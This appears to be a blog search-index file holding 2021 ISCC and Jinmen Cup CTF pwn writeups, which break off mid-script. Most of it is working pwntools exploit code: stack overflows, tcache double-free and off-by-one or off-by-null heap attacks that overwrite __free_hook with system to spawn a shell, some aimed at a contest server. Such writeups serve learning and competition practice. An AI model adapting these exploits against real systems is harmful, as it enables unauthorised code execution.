<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2021 ISCC 信息安全与对抗技术竞赛Writeup</title>
      <link href="archives/f4b801d2/"/>
      <url>archives/f4b801d2/</url>
      
        <content type="html"><![CDATA[<h2 id="M78"><a href="#M78" class="headerlink" title="M78"></a>M78</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./M78&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;39.96.88.40&quot;</span>,<span class="number">7010</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./M78&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;building\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">25</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;password\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p,&quot;b *0x080492B0&quot;)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;b&#x27;</span>*(<span class="number">0x18</span>+<span class="number">0x4</span>)+p32(<span class="number">0x08049202</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x107</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment"># payload = &#x27;a&#x27;*0x107</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./game&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;39.96.88.40&quot;</span>,<span class="number">7040</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">36</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">num = [<span class="number">55</span>,<span class="number">15</span>,<span class="number">82</span>,<span class="number">1</span>,<span class="number">0x62</span>,<span class="number">0x44</span>,<span class="number">0x43</span>,<span class="number">0xf</span>,<span class="number">0x56</span>,<span class="number">0x3</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;is :&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> num:</span><br><span class="line">    p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p,&quot;b *$rebase(0xAF0)&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Box"><a href="#Box" class="headerlink" title="Box"></a>Box</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./pwn&quot;)</span></span><br><span class="line"><span class="comment"># p = process([&quot;/glibc/2.27/amd64/lib/ld-2.27.so&quot;, &quot;./pwn&quot;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;/glibc/2.27/amd64/lib/libc-2.27.so&quot;&#125;)</span></span><br><span class="line">p = remote(<span class="string">&quot;39.96.88.40&quot;</span>,<span class="number">7020</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;/glibc/2.27/amd64/lib/libc-2.27.so&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params"><span class="built_in">id</span>,size,content=<span class="string">&#x27;a&#x27;</span></span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:\n&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;:\n&quot;</span>,content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:\n&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:\n&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;:\n&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    p.sendafter(<span class="string">&quot;:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># add(2,0x100)</span></span><br><span class="line"><span class="comment"># add(0,0x68)</span></span><br><span class="line"><span class="comment"># add(1,0x68)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># delete(2)</span></span><br><span class="line"><span class="comment"># show(2)</span></span><br><span class="line"><span class="comment"># leak_addr = u64(p.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="comment"># libc_base = leak_addr - 0x3c4b78</span></span><br><span class="line"><span class="comment"># log.info(&quot;libc_base:&quot;+hex(libc_base))</span></span><br><span class="line"><span class="comment"># malloc_hook = libc_base + libc.sym[&#x27;__malloc_hook&#x27;]</span></span><br><span class="line"><span class="comment"># log.info(&quot;malloc_hook:&quot;+hex(malloc_hook))</span></span><br><span class="line"><span class="comment"># system_addr = libc_base + libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment"># free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]</span></span><br><span class="line"><span class="comment"># log.info(&quot;free_hook:&quot;+hex(free_hook))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># delete(0)</span></span><br><span class="line"><span class="comment"># delete(1)</span></span><br><span class="line"><span class="comment"># delete(0)</span></span><br><span class="line"><span class="comment"># add(3,0x68,p64(malloc_hook-0x23))</span></span><br><span class="line"><span class="comment"># add(4,0x68)</span></span><br><span class="line"><span class="comment"># add(5,0x68)</span></span><br><span class="line"><span class="comment"># add(6,0x68,&#x27;a&#x27;*0x13+p64(system_addr))</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x200</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">96</span></span><br><span class="line">log.info(<span class="string">&quot;main_arean:&quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x3ebc40</span><span class="comment">#0x3aeca0+96</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;system_addr:&quot;</span>+<span class="built_in">hex</span>(system_addr))</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;free_hook:&quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">binsh_str = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x68</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x68</span>,p64(system_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p,&#x27;b *$rebase(0xD66)&#x27;)</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="碰碰碰"><a href="#碰碰碰" class="headerlink" title="碰碰碰"></a>碰碰碰</h2><p>爆破 canary ，主办方下架了题目</p><h2 id="Num"><a href="#Num" class="headerlink" title="Num"></a>Num</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./NUM&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;39.96.88.40&quot;</span>,<span class="number">7030</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./NUM&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;?\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;NUM\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line">shell = <span class="number">0x080491B2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p,&quot;b *0x08049356&quot;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;?\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="string">&#x27;3&#x27;</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;?\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">112</span>+<span class="number">4</span>+<span class="number">16</span>))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0xb2</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;?\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="string">&#x27;3&#x27;</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;?\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">113</span>+<span class="number">4</span>+<span class="number">16</span>))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x91</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;?\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="string">&#x27;3&#x27;</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;?\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">114</span>+<span class="number">4</span>+<span class="number">16</span>))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x04</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;?\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="string">&#x27;3&#x27;</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;?\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">115</span>+<span class="number">4</span>+<span class="number">16</span>))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x08</span>))</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ISCC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021津门杯Writeup</title>
      <link href="archives/a24f3497/"/>
      <url>archives/a24f3497/</url>
      
        <content type="html"><![CDATA[<h2 id="easypwn"><a href="#easypwn" class="headerlink" title="easypwn"></a>easypwn</h2><p>新建的堆块时，存在 off by one </p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210511234704.png" alt="image-20210511234656019"></p><p>phone number 和 name 写入函数使用的是 scanf 。<strong>scanf 是危险函数，可以一直输入直到遇到 <code>\n</code> 。</strong></p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210511234812.png" alt="image-20210511234810990"></p><p>指针存放地址在 name 后面，可以通过溢出修改指针地址。</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210511234927.png" alt="image-20210511234926118"></p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(cmd))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">number,name,size,des</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;number:&quot;</span>,number)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;name:&quot;</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;info:&quot;</span>,des)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_1</span>(<span class="params">number,name,size</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;number:&quot;</span>,number)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;name:&quot;</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>,number,name,des</span>):</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;number:&quot;</span>,number)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;name:&quot;</span>,name)</span><br><span class="line">    p.sendafter(<span class="string">&quot;info:&quot;</span>,des)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./hello&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>,<span class="number">0x80</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x81</span>)</span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>,<span class="number">0x80</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x81</span>)</span><br><span class="line">add(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>,<span class="number">0x80</span>,<span class="string">&#x27;/bin/sh\x00\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>,<span class="string">&#x27;b&#x27;</span>*(<span class="number">0xd</span>-<span class="number">1</span>),<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">main_arean_xx = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;main_arean_xx:&quot;</span>+<span class="built_in">hex</span>(main_arean_xx))</span><br><span class="line">libc_base = main_arean_xx - (<span class="number">0x7fa2625e2b78</span>-<span class="number">0x7fa26221e000</span>)</span><br><span class="line">log.info(<span class="string">&quot;main_arean_xx:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;free_hook:&quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;system_addr:&quot;</span>+<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p,&quot;b *$rebase(0xde9)&quot;)</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0xd</span>+p64(free_hook),p64(system_addr)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="PwnCTFM"><a href="#PwnCTFM" class="headerlink" title="PwnCTFM"></a>PwnCTFM</h2><p>漏洞点在 add 的时，先将堆内存写入到 alloc 申请的栈空间，然后用 strcpy 将栈空间内容复制到堆中。</p><p>Strcpy 特性：</p><ul><li>会一直复制，直到遇到 <code>\x00</code></li><li>将字符串复制到目的内存后会加上 <code>\x00</code> ，而 strncpy 则不会</li></ul><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210512234946.png" alt="image-20210512234945617"></p><p>这条题目利用 strcpy 会在字符串后面加上 <code>\x00</code> ，造成 off by null 。大概思路：</p><ol><li>off by null 造成堆重叠，泄露 libc</li><li>基于上面堆分布，申请两个指向同一地址的指针，fastbin attack</li></ol><p>形成堆重叠需要修改 prev_size ，strcpy 会遇到 <code>\x00</code> 截断，所以要弄个循环清空 prev_size 搞字节：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#清洗prev_size</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(<span class="string">&#x27;a&#x27;</span>,<span class="number">0x68</span>,<span class="string">&#x27;b&#x27;</span>*(<span class="number">0x60</span>+(<span class="number">8</span>-i)),-<span class="number">1</span>)<span class="comment">#0</span></span><br><span class="line">    delete(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 